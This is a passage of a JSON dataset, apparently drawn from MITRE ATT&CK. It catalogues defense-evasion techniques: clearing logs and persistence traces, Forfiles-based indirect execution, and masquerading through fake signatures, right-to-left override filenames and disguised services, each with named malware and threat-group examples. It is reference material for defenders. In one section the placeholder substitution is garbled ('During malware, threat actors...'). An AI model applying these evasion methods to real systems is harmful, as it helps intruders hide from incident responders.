                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under [1]:HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\DefaultHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\ServersWindows may also store information about recent RDP connections in files such as C:\\Users\\%username%\\Documents\\Default.rdp and C:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServer Client\\Cache\\.[2] Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in /Library/Logs and/or /var/log/).[3][4][5]Malicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "Procedure": {
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> also removed the firewall rules it created during execution.[6]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> have inspected server logs to remove their IPs.[7]"
                    }
                }
            },
            "008": {
                "name": "Clear Mailbox Data",
                "href": "/techniques/T1070/008",
                "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the ExchangePowerShell PowerShell module, including Remove-MailboxExportRequest to remove evidence of mailbox exports.[1][2] On Linux and macOS, adversaries may also delete emails through a command line utility called mail  or use AppleScript to interact with APIs on macOS.[3][4]Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.[5]",
                "Procedure": {
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to delete emails used for C2 once the content has been copied.[3]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 removed evidence of email export requests using Remove-MailboxExportRequest.[1]"
                    }
                }
            },
            "009": {
                "name": "Clear Persistence",
                "href": "/techniques/T1070/009",
                "description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.[1] Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).[2]In some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.[3]",
                "Procedure": {
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name>'s loader can delete scheduled tasks created by a previous instance of the malware.[3]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can delete previously created tasks on a compromised host.[4]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> can delete created registry keys used for persistence as part of its cleanup procedure.[5]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> has the ability to remove set Registry Keys, including those used for persistence.[6]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> is capable of deleting Registry keys used for persistence.[1]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> is capable of manipulating and deleting registry keys, including those used for persistence.[7]"
                    },
                    "S0517": {
                        "ID": "S0517",
                        "Name": "Pillowmint",
                        "Description": "<name> can uninstall the malicious service from an infected machine.[8]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> has the ability to remove Registry entries that it created for persistence.[9]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> has deleted accounts it has created.[1]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> removed IFEO registry values to clean up traces of persistence.[10]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
        "Procedure": {
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has used the THINBLOOD utility to clear SSL VPN log files located at /home/runtime/logs.[1][2]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware deletes all artifacts associated with the malware from the infected machine.[3]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has removed the watermark associated with enabling the TESTSIGNING boot configuration option by removing the relevant strings in the user32.dll.mui of the system.[4]"
            },
            "S0527": {
                "ID": "S0527",
                "Name": "CSPY Downloader",
                "Description": "malware has the ability to remove values it writes to the Registry.[5]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887.[6][7]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can uninstall malicious components from the Registry, stop processes, and clear the browser history.[8]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware can erase file references to payloads in-memory after being reflectively loaded and executed.[9]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware has a function called \"DeleteLeftovers\" to remove certain artifacts of the attack.[10]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware can close specific Windows Security and Internet Explorer dialog boxes to mask external connections.[11]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware has the ability to clean traces of malware deployment.[12]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.[13][14]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked.[15]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has used the \"Wow64RevertWow64FsRedirection\" function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.[16]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has a command to delete a Registry key it uses, \\Software\\Microsoft\\Internet Explorer\\notes.[17]"
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware can clear the browser history on a compromised host by changing the ClearBrowsingHistoryOnExit value to 1 in the HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Privacy Registry key.[18]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can overwrite Registry settings to reduce its visibility on the victim.[19]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can clear a memory blog in the process by overwriting it with junk bytes.[20]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to delete created WMI objects to evade detections.[21]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to clean up and remove data structures from a compromised host.[22]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has deleted arbitrary Registry values.[23]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware will delete an associated registry key if a certain server response is received.[24]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can remove artifacts from the compromised host, including created Registry keys.[25]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.[26]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware can delete OLE Automation and SQL stored procedures used to store malicious payloads.[27]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware removed HTTP proxy registry values to clean up traces of execution.[28]"
            }
        }
    },
    "T1202": {
        "ttp_name": "Indirect Command Execution",
        "ttp_id": "T1202",
        "href": "/techniques/T1202",
        "tactic": "Defense Evasion",
        "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts. [1] [2]Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.",
        "Procedure": {
            "S0193": {
                "ID": "S0193",
                "Name": "Forfiles",
                "Description": "malware can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.[1][2]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware persistence mechanisms have used forfiles.exe to execute .htm files.[3]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware uses the Forfiles utility to execute commands on the system.[4]"
            }
        }
    },
    "T1036": {
        "ttp_name": "Masquerading",
        "ttp_id": "T1036",
        "href": "/techniques/T1036",
        "subtechnique": {
            "001": {
                "name": "Invalid Code Signature",
                "href": "/techniques/T1036/001",
                "description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.[1]Unlike Code Signing, this activity will not result in a valid signature.",
                "Procedure": {
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has signed its malware with an invalid digital certificates listed as \"Tencent Technology (Shenzhen) Company Limited.\"[2]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.[3]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> has used unverified signatures on malicious DLLs.[4]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "The <name> client has been signed by fake and invalid digital certificates.[5]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has used an invalid certificate in attempt to appear legitimate.[6]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "<name> stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.[7]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used revoked certificates to sign malware.[8][9]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> has been incompletely signed with revoked certificates.[8]"
                    }
                }
            },
            "002": {
                "name": "Right-to-Left Override",
                "href": "/techniques/T1036/002",
                "description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \\u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\\u202Egnp.js will be displayed as photo_high_resj.png.[1]Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.[2][3] RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
                "Procedure": {
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.[4]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used Right-to-Left Override to deceive victims into executing several strains of malware.[5]"
                    },
                    "G0137": {
                        "ID": "G0137",
                        "Name": "Ferocious Kitten",
                        "Description": "<name> has used right-to-left override to reverse executables\u2019 names to make them appear to have different file extensions, rather than their real ones.[6]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.[7]"
                    },
                    "G0029": {
                        "ID": "G0029",
                        "Name": "Scarlet Mimic",
                        "Description": "<name> has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.[8]"
                    }
                }
            },
            "003": {
                "name": "Rename System Utilities",
                "href": "/techniques/T1036/003",
                "description": "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. [1] It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe). [2] An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. [3]",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has moved and renamed pubprn.vbs to a .txt file to avoid detection.[4]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "The <name> dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.[3]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> executes a Windows Batch script during installation that creases a randomly-named directory in the C:\\ root directory that copies and renames the legitimate Windows curl command to this new location.[5]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used a renamed cmd.exe file to evade detection.[6]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> has renamed an image of cmd.exe with a random name followed by a .tmpl extension.[7]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has renamed system utilities such as wscript.exe and mshta.exe.[8]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.[9]"
                    }
                }
            },
            "004": {
                "name": "Masquerade Task or Service",
                "href": "/techniques/T1036/004",
                "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.[1][2] Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.[3][4]",
                "Procedure": {
                    "C0034": {
                        "ID": "C0034",
                        "Name": "2022 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.[5]"
                    },
                    "G0099": {
                        "ID": "G0099",
                        "Name": "APT-C-36",
                        "Description": "<name> has disguised its scheduled tasks as those used by Google.[6]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. <name> has also impersonated the legitimate Flash installer file name \"install_flashplayer.exe\".[7]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has created services to appear as benign system tools.[8]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).[9]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has disguised their backdoor droppers with naming conventions designed to blend into normal operations.[10]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can create a task named to appear benign.[11]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has disguised malware as a Windows Security update service.[12]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> has established persistence by creating a new service named FAX after deleting the legitimate service by the same name.[13][14][15]"
                    },
                    "S0471": {
                        "ID": "S0471",
                        "Name": "build_downer",
                        "Description": "<name> has added itself to the Registry Run key as \"NVIDIA\" to appear legitimate.[16]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 used SCHTASKS  /Change to modify legitimate scheduled tasks to run malicious code.[17]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> has copied legitimate service names to use for malicious services.[18]"
                    },
                    "S0261": {
                        "ID": "S0261",
                        "Name": "Catchamas",
                        "Description": "<name> adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.[19]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has used a task name associated with Windows SQM Consolidator.[20]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> has established persistence with a scheduled task impersonating the Outlook item finder.[21]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.[22]"
                    },
                    "S1033": {
                        "ID": "S1033",
                        "Name": "DCSrv",
                        "Description": "<name> has masqueraded its service as a legitimate svchost.exe process.[23]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "<name> has used schtasks /change to modify scheduled tasks including \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared.[17]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has masqueraded the svchost.exe process to exfiltrate data.[24]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has installed itself as a new service with the service name Windows Defender System Service and display name WinDefService.[25]"
                    },
                    "S0343": {
                        "ID": "S0343",
                        "Name": "Exaramel for Windows",
                        "Description": "The <name> dropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV\" in an apparent attempt to masquerade as a legitimate service.[26]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used scheduled tasks names such as acrotyr and AppServicesr to mimic the same names in a compromised network's C:\\Windows directory.[27]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service.[28]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has created a scheduled task named \"AdobeFlashSync\" to establish persistence.[29]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has named the task for a reverse proxy lpupdate to appear legitimate.[30]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors named a malicious scheduled task \"WinUpdate\" for persistence.[31]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> has used a service named WSearch for execution.[32]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> has masqueraded as the rsyncd and dbus-inotifier services.[4]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has impersonated systems management software to avoid detection.[33]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> has created a new executable named Software Update Check to appear legitimate.[34][35]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> has been named srvdll.dll to appear as a legitimate service.[36]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> named a shellcode loader binary svchast.exe to spoof the legitimate svchost.exe.[37][38]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has disguised itself as a known Linux process.[39]"
                    },
                    "S0259": {
                        "ID": "S0259",
                        "Name": "InnaputRAT",
                        "Description": "<name> variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.[40]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has attempted to disguise itself by registering under a seemingly legitimate service name.[41]"
                    },
                    "S0581": {
                        "ID": "S0581",
                        "Name": "IronNetInjector",
                        "Description": "<name> has been disguised as a legitimate service using the name PythonUpdateSrvc.[42]"
                    },
                    "S0607": {
                        "ID": "S0607",
                        "Name": "KillDisk",
                        "Description": "<name> registers as a service under the Plug-And-Play Support name.[43]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has disguised services to appear as benign software or related to operating system functions.[44]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has pretended to be the xmlProv Network Provisioning service.[45]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.[46]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used a scheduled task named SRCheck to mask the execution of a malicious .dll.[47]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks.[48]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has named a malicious script CacheTask.bat to mimic a legitimate task.[49]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> operators have created scheduled tasks masquerading as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\" designed to launch the ransomware.[50]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> has been disguised as the Windows Power Efficiency Diagnostics report tool.[51]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> renamed a malicious service taskmgr to appear to be a legitimate version of Task Manager.[52]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> has created a service named \"Windows Update Agent1\" to appear legitimate.[52]"
                    },
                    "S0118": {
                        "ID": "S0118",
                        "Name": "Nidiran",
                        "Description": "<name> can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.[53][54]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> has created a service named WmdmPmSp to spoof a Windows Media service.[55]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.[56]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> uses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as, naming a LaunchAgent plist file com.apple.openssl.plist which executes <name> from the user's ~/Library/OpenSSL/ folder upon user login.[57]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "<name> can mimic the names and descriptions of legitimate services such as iphlpsvc, IP Helper,  and Onedrive to evade detection.[58]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "In one instance, menuPass added <name> as a service with a display name of \"Corel Writing Tools Utility.\"[59]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> has created a scheduled task named \"MicrosoftEdge\" to establish persistence.[60]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has named services to appear legitimate.[61][62]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> has named services and scheduled tasks to appear benign including \"ChromeCheck\" and \"googleupdate.\"[52]"
                    },
                    "S0169": {
                        "ID": "S0169",
                        "Name": "RawPOS",
                        "Description": "New services created by <name> are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".[63][64][65]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> has used Windows Video Service as a name for malicious services.[66]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> has named the scheduled task it creates \"Windows Update\".[67]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> has masqueraded as a service called \"SaSaut\" with a display name of \"System Authorization Service\" in an apparent attempt to masquerade as a legitimate service.[68]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> creates a new service named \"ntssrv\" that attempts to appear legitimate; the service's display name is \"Microsoft Network Realtime Inspection Service\" and its description is \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.\" Newer versions create the \"MaintenaceSrv\" service, which misspells the word \"maintenance.\"[3][69]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> can impersonate Windows services and antivirus products to avoid detection on compromised systems.[70]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has named a service it establishes on victim machines as \"TaskFrame\" to hide its malicious purpose.[71]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 named tasks \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager in order to appear legitimate.[72]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has named services to appear legitimate.[61][62]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "<name>'s scheduled task has been named MicrosoftInternetExplorerCrashRepoeterTaskMachineUA or MicrosoftEdgeCrashRepoeterTaskMachineUA, depending on the Windows OS version.[73]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has named a task RecoveryExTask as part of its persistence activity.[74]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has named their unit configuration file similarly to other unit files residing in the same directory, /usr/lib/systemd/system/, to appear benign.[75]"
                    },
                    "S1011": {
                        "ID": "S1011",
                        "Name": "Tarrask",
                        "Description": "<name> creates a scheduled task called \"WinUpdate\" to re-establish any dropped  C2 connections.[76]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> has mimicked an existing Windows service by being installed as Windows Time Service.[77]"
                    },
                    "S0178": {
                        "ID": "S0178",
                        "Name": "Truvasys",
                        "Description": "To establish persistence, <name> adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.[78]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> can disguise as a legitimate service to blend into normal operations.[10]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> has registered a service named WerFaultSvc, likely to spoof the legitimate Windows error reporting service.[79]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "Some <name> variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.[80][81]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf.[82] It has also used common document file names for other malware binaries.[83]"
                    },
                    "G0128": {
                        "ID": "G0128",
